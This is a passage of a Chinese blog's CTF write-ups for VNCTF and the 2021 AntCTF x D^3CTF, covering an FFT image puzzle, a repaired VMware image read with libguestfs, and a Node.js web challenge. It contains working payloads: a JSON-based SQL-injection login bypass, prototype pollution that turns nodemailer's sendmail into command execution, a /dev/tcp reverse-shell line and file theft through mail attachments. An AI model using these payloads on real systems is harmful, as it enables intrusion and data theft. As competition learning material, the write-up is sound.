能正常打开里面的图片，还能提取出来，那就懒了（跑 然后 fft 转换到频域就能看到 flag。 clc;clear;close all; im = double(imread('FFT.png'))/255; F=fft2(im); imshow(F); 这里还没有做 fftshift，不过问题不大，flag 也能出了。 VNCTF{Ff5_1S_bEauTiful} WebEz_game这题比赛结束前几分钟来看了看（ game.js 这里有一段 sojson 加密的。 ['sojson.v4'][\"\\x66\\x69\\x6c\\x74\\x65\\x72\"][\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"](((['sojson.v4']+[])[\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"]['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65']['\\x61\\x70\\x70\\x6c\\x79'](null,\"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41\"['\\x73\\x70\\x6c\\x69\\x74'](/[a-zA-Z]{1,}/))))('sojson.v4'); 来 https://www.sojson.com/jsjiemi.html 或者 https://tool.lu/js 这里解密一下，其实就是解码了一下（ ['sojson.v4'][\"filter\"][\"constructor\"](((['sojson.v4'] + [])[\"constructor\"]['fromCharCode']['apply'](null, \"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41\" ['split'](/[a-zA-Z]{1,}/))))('sojson.v4'); 直接在 console 里把最后的 ('sojson.v4'); 去掉，然后执行就能在 sources 里看到源码。 很明显就看到 flag 了。 flag{this_game_is_funny!} 小结其实就随意看了看题，这篇文章当水一水好了。 （甚至躺在草稿箱里长草了，还没发 发了发了。 （溜了溜了喵","path":"2021/03/15/CTF_2021VNCTF/"},{"title":"CTF | 2021 AntCTF x D^3CTF WriteUp","text":"引言2021 AntCTF x D^3CTF AntCTF x D^3CTF 是蚂蚁集团安全响应中心（AntSRC）携手三支“电子科大”队伍：杭电 Vidar-Team、西电 L-Team 及成电 CNSS 共同举办的 CTF 赛事（暨第十二届 HCTF、第五届 LCTF） 线上赛 3月5日 20:00－3月7日 20:00 介绍页面： https://d3ctf.io/ 比赛平台： https://ant-d3ctf.alipay.com/ 前不久看群里师傅推了这个比赛，就来打打玩玩好了。 比赛题目放出来才发现还是挺有难度的，于是喵喵也不会做，大哭呜呜呜。 和队里师傅一起打的，这里就简单写写我做的吧。 MiscVirtual Love You say you love me, but you don’t know me at all! Your love…Your love is all virtual!（Login User: guest）The second part of the attachment：https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar 好家伙，6GiB 的 Vmware 虚拟机镜像！ 解压出来导入 Vmware，发现需要密码。 第一次遇到这种题唉，于是想到爆破这个密码。 GitHub 上找到了 pyvmx-cracker 这个工具，但是跑了 10W+ 的字典都没跑出来，于是放弃。 又想到能不能直接导入虚拟机镜像 vmdk 啊，试了试还是报错了。 再去看看 VirtualLove-s00*.vmdk 文件，找个正常的比对了一下，好家伙，去掉了文件头啊！ 改好文件头，再一看还是不对啊！！！ 再比对了亿下，怎么还去掉了文件头部另外一段…… 嗯，到这里还是报错。 再看 VirtualLove.vmdk，发现把 version 标记给整没了。 加上，终于能够正常启动了。 guest 用户登录。 坏耶！有假的 flag！ 提示需要进入 root，于是试着提权。 坏耶！都最新版本了！看上去 setuid 提权也不大行。/etc/passwd 也不可写。计划任务也不行。 （查了半天怎么提权，我好菜啊喵呜呜 Centos普通用户提权至ROOT 利用 /bin/ping rws 中的 s 的漏洞 Linux提权：从入门到放弃 对Linux 提权的简单总结 【安全科普】Linux提权——利用可执行文件SUID etc. 发现貌似一个都提不了权。 再后来，想到我有镜像啊，何必呢！我可以改 root 用户的密码啊。 GitHub 上找到了个 change-root-passwd 可以参考 修改虚拟机镜像的root密码 这篇来实现。 再进一步，我都有镜像了，啥都能提取的啊！啊我是废物呜呜呜。 于是又找到了 Libguestfs，一个用来访问和修改虚拟机磁盘镜像的一个工具集 虚拟机镜像管理工具– Libguestfs CentOS7.1 KVM虚拟化之libguestfs-tools工具常用命令介绍 apt install libguestfs-tools virt-ls VirtualLove.vmdk /root virt-cat VirtualLove.vmdk /root/flagggg.txt d3ctf{Vmw@RE_1s_5o_C0mpl3x_b99d1320cf} Virtual Love_Revenge I’m coming for revenge.You say you love me, but you don’t know me at all! Your love…Your love is all virtual!（Login User: guest）The second part of the attachment：https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar 又是 6GiB 的虚拟机镜像，喂，这比赛占了我硬盘巨大空间啊喂！ 另外还有个 true_flag.rar 这次还是照样改 VirtualLove-s00*.vmdk 文件头部。 以及 VirtualLove.vmdk 改的真多 然后一样新建虚拟机导入镜像。 还是一样的假 flag。 用 libguestfs-tools 看看 /root，然后读取这个文件。 f5`FU2)I$F0Oc'qL@pP)S 这个就是压缩包的密码。 解压拿到 flag d3ctf{Vmw@RE_1s_5oooo_C0mpl3x_ec4bb60e58} 其实这里我还寻思着是不是漏了啥呢，是不是还套了好几步，于是还想着改 root 密码（（ BTW, anaconda-ks.cfg 这个文件里就存了 root 的密码 Linux:root下的文件-anaconda-ks.cfg详解 以及 通过 单用户模式 或者 救援模式 rescue mode 去更改 root 密码。 Linux 忘记密码解决方法 Linux中Root密码破解 Virtual Love_Revenge2.0 *I’m coming for revenge again.*You say you love me, but you don’t know me at all! Your love…Your love is all virtual!（Login User: guest）The second part of the attachment：https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar 喂！！！有完没完啊！太有毒了！ （怎么这比赛这么占硬盘空间 先是和上一题一样的操作，做的要吐了…… 然后之后看图。 压缩包密码 2F!,O&lt;DJ+@&lt;*K0@&lt;6L(Df- d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_[目标文件md5]} d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_8cf8463b34caa8ac871a52d5dd7ad1ef} 好耶，是一血！ （盲猜是不是之前的题目有人直接 grep / binwalk 或者怎么样提取到了字符串什么的吧 问了出题人说非预期是 压缩包的密码和最开始版本的 flag 在同一个位置，没进行其他处理，所以直接就能在010里找到。 预期解是爆破 vmx 的密码，字典隐写在 log 里了。然后修复 vmx，再修修其他的几个文件就可以进去了。 emmmm Web8-bit pub Wellcome to 8-bit pub, take a seat and enjoy drinking here!Attachment: https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zipPS: Try to execute /readflagPPS: The container restarts every 3 minutesFlag Format: d3ctf{this_is_a_sample_flag} Challenge Address http://6d5f59df15.8bit-pub.d3ctf.io 给了源码，直接看，是 Nodejs。 盲猜又是原型链污染。于是就去找有没有。 看了一下依赖的版本都挺新的，emmm。（可以试试 npm audit 发现给的源码中唯一一处可能的是在发邮件这里。 controllers/adminController.js const send = require(\"../utils/mail\"); const shvl = require(\"shvl\"); module.exports = { home: function (req, res) { return res.sendView(\"admin.html\"); }, email: async function (req, res) { let contents = {}; Object.keys(req.body).forEach((key) =&gt; { shvl.set(contents, key, req.body[key]); }); contents.from = '\"admin\" &lt;admin@8-bit.pub&gt;'; try { await send(contents); return res.json({message: \"Success.\"}); } catch (err) { return res.status(500).json({ message: err.message }); } }, }; 通过 shvl.set 把接收到的参数赋值给 contents，之后就传进发邮件的了。 那怎么进入这个发邮件呢？ 根据 routes/index.js 可以看到路由，需要鉴权，就是 admin。 const express = require(\"express\"); const router = express.Router(); const adminController = require(\"../controllers/adminController\"); const indexController = require(\"../controllers/indexController\"); const usersController = require(\"../controllers/usersController\"); const auth = require(\"../utils/auth\"); router.get(\"/\", indexController.home); router.get(\"/signin\", usersController.signinPage); router.get(\"/signup\", usersController.signupPage); router.get(\"/logout\", usersController.logout); router.get(\"/admin\", auth, adminController.home); router.post(\"/user/signin\", usersController.signin); router.post(\"/user/signup\", usersController.signup); router.post(\"/admin/email\", auth, adminController.email); module.exports = router; 看 utils/auth.js let auth = function (req, res, next) { if (!req.session.username) { return res.redirect(302, \"/\"); } if (req.session.username !== \"admin\") { if (req.method === \"GET\") { return res.sendView(\"forbidden.html\"); } else { return res.json({ message: \"Forbidden.\" }); } } next(); }; module.exports = auth; 需要 session.username 为 admin。那首先要登录。 controllers/usersController.js const user = require(\"../modules/users\"); module.exports = { signinPage: function (req, res) { return res.sendView(\"signin.html\"); }, signupPage: function (req, res) { return res.sendView(\"signup.html\"); }, signin: function (req, res) { user.signin(req.body.username, req.body.password, function (err, result) { if (err) { return res.status(500).json({ message: err.message }); } if (result.length) { req.session.username = result[0].username; return res.json({ message: \"Signin success.\" }); } else { return res.status(401).json({ message: \"Username or password wrong.\" }); } }); }, signup: function (req, res) { user.signup(req.body.username, req.body.password, function (err, result) { if (err) { return res.status(500).json({ message: err.message }); } return res.json({ message: \"Signup success.\" }); }); }, logout: function (req, res) { req.session.username = undefined; return res.redirect(302, \"/\"); } }; 再看 modules/users.js const sql = require(\"../utils/db.js\"); module.exports = { signup: function (username, password, done) { sql.query( \"SELECT * FROM users WHERE username = ?\", [username], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } if (!res.length) { sql.query( \"INSERT INTO users VALUES (?, ?)\", [username, password], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } else { return done(null, res.insertId); } } ); } else { return done({ message: \"Username already taken.\" }, null); } }); }, signin: function (username, password, done) { sql.query( \"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } else { return done(null, res); } } ); }, }; 草，还要 SQL 注入…… 于是 思路就是首先 SQL 注入登录 admin 用户，然后通过发邮件的接口污染原型链读取 flag，或者反弹 shell 之类的。 但是注意的是，它这里不是手动拼接的 SQL 语句，利用 nodejs 里的 mysql 封装好的函数，通过占位符和参数来进行的，这样会自动转义危险的字符。 于是这里试了挺久都没打通（（ 网页上试了试，发现是 urlencode 传参，但是在 app.js 中可以知道 json 也支持的，那就开打。 SQL 注入，一般的绕过都不大行，但是利用 JavaScript 的弱类型和 JSON 的特性，可以传入一些奇奇怪怪的东西。 参考： nodejs应用中的权限绕过漏洞—一个赏金漏洞的故事 一道有趣的关于nodejs的ctf题 构造登录 payload，打过去。 {\"username\":[0], \"password\": true} {\"username\":[0], \"password\": [0]} 发现确实登录成功了，但是看上去并不是 admin。 可是队友本地搭环境出来确实可行。 不知道是数据库环境的问题还是什么（ 后来又试了试，发现 0 1 4 5 等好几个值都能绕过，成功登录，但都不是 admin。 于是考虑 username 还得是 admin。 在不断地尝试下，构造 {\"username\":\"admin\",\"password\":{\"password\":[1]}} 生成的 SQL 为 SELECT * FROM users WHERE username = 'admin' AND password = `password` = 1 打过去，终于成了。 接下来就 污染原型链。 看了看 shvl 项目文档. 🚧 Get and set dot-notated properties within an object. 可以通过 . 来索引，shvl.set(obj, 'a.b.c', 2); 这样来给 object 赋值。 本来先想着反弹 shell，发现不行。 {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\")//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} //或者 {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__.env.AAAA\": \"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\")//\", \"__proto__.env.NODE_OPTIONS\":\"--require /proc/self/environ\"} 后来想到这个貌似需要 fork 进程才能实现，于是不行。（再后来发现又可以了，有 spawn 然后再试了试，发现貌似不能污染原型链……（？？？） {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__.html\":\"&lt;i&gt;Miao&lt;/i&gt;233333\"} 这个打过去收到的邮件里并不是 html 中的内容，说明没有污染到。 再去看 utils/mail.js const nodemailer = require(\"nodemailer\"); async function send(contents) { let transporter = nodemailer.createTransport({ host: \"******\", // Plz use your own smtp server for testing. port: 25, tls: { rejectUnauthorized: false }, auth: { user: \"******\", pass: \"******\", }, }); return transporter.sendMail(contents); } module.exports = send; 调用了 nodemailer 进行发送。 查看其文档 Message configuration，发现有个 Attachments，可以发附件，那就试试能否把 flag 带出来。 {\"to\":\"xxx\",\"subject\":\"1\",\"text\":\"1\", \"attachments\": { \"path\": \"/readflag\" }} {\"to\":\"xxx\",\"subject\":\"1\",\"text\":\"1\", \"attachments\": { \"path\": \"/flag\" }} 失败了，没有权限执行。 然后读了点其他东西，试了下当前目录在 /var/www/web /proc/self/environ 环境变量 以及 数据库/session/mail 的一些信息，但是也没啥用啊。 难不成 SMTP 去窃取别人的附件（没试过不知道行不行 233 这时候再回过来看 shvl 源码 export function set (object, path, val, obj) { return !/__proto__/.test(path) &amp;&amp; ((path = path.split ? path.split('.') : path.slice(0)).slice(0, -1).reduce(function (obj, p) { return obj[p] = obj[p] || {}; }, obj = object)[path.pop()] = val), object; }; 噢，原来它把 __proto__ 给过滤掉了，难怪打不通。 但是还有 constructor: { prototype: { attachments: { path: '/readflag' } } } 这样应该能绕过。 直接写发现没有附件。 还是需要用 . 来。 这回思路就通了，就 找污染哪里能执行代码 呢。 又去翻 nodemailer 的源码。 根据文档 Sendmail transport，发现可以传个 args 参数。 跟进 send 源码 node_modules/nodemailer/lib/sendmail-transport/index.js#108 好家伙！ 那就把 path args 给污染好了。 构造代码成下面这样。 const nodemailer = require(\"nodemailer\"); let transporter = nodemailer.createTransport({ sendmail: true, path: \"/bin/sh\", args: [\"-c\", \"touch /tmp/a\"], }); transporter.sendMail( { from: \"sender@example.com\", to: \"recipient@example.com\", subject: \"Message\", text: \"I hope this message gets delivered!\", }, (err, info) =&gt; { console.log(info.envelope); console.log(info.messageId); } ); 再参考 2019 D^3 CTF-ezts复现 这题应该执行 /readflag 就能输出 /flag。 Payload: 先把 flag 读出来，再通过附件发邮件。 {\"to\":\"xxx\",\"subject\":\"/readflag test\",\"text\":\"/readflag test\", \"constructor.prototype.sendmail\": \"true\", \"constructor.prototype.path\": \"/bin/sh\", \"constructor.prototype.args\": [\"-c\",\"/readflag&gt;/tmp/miao\"]} {\"to\":\"xxx\",\"subject\":\"flag\",\"text\":\"temp\", \"constructor.prototype.attachments.path\": \"/tmp/miao\"} 发现写的时候报错，但确实写入文件了。 最后在 邮件附件里拿到 flag d3ctf{01c185051349caebc42bf2a2bef08e9cca73b0f9bf680cf6406127081c6679eb} 哇呜！！！！！终于出了！！！ 这题和队友从晚上 6.看到 11. 太顶了！ 可是比赛结束了 呜呜呜 问题不大，学到了许多。 BTW, 读了一下根目录。 total 876 drwxr-xr-x 1 root root 4096 Mar 5 05:08 . drwxr-xr-x 1 root root 4096 Mar 5 05:08 .. -rwxr-xr-x 1 root root 0 Mar 5 05:08 .dockerenv drwxr-xr-x 1 root root 4096 Feb 24 21:05 bin drwxr-xr-x 5 root root 340 Mar 6 04:35 dev drwxr-xr-x 1 root root 4096 Mar 5 16:10 etc ---------- 1 root root 71 Mar 5 03:52 flag drwxr-xr-x 1 root root 4096 Feb 24 21:05 home drwxr-xr-x 1 root root 4096 Feb 24 21:05 lib drwxr-xr-x 5 root root 4096 Feb 23 19:33 media drwxr-xr-x 2 root root 4096 Feb 23 19:33 mnt drwxr-xr-x 1 root root 4096 Feb 24 21:05 opt dr-xr-xr-x 222 root root 0 Mar 6 04:35 proc ---S-----x 1 root root 803240 Feb 27 07:56 readflag drwx------ 1 root root 4096 Mar 6 04:20 root drwxr-xr-x 1 root root 4096 Mar 7 00:21 run drwxr-xr-x 2 root root 4096 Feb 23 19:33 sbin drwxr-xr-x 2 root root 4096 Feb 23 19:33 srv dr-xr-xr-x 13 root root 0 Mar 6 04:35 sys drwxrwxrwt 1 root root 4096 Mar 7 15:25 tmp drwxr-xr-x 1 root root 4096 Feb 24 21:05 usr drwxr-xr-x 1 root root 4096 Mar 3 15:48 var readflag 有 S属性，能够临时提升权限来读取 flag。 代码类似于 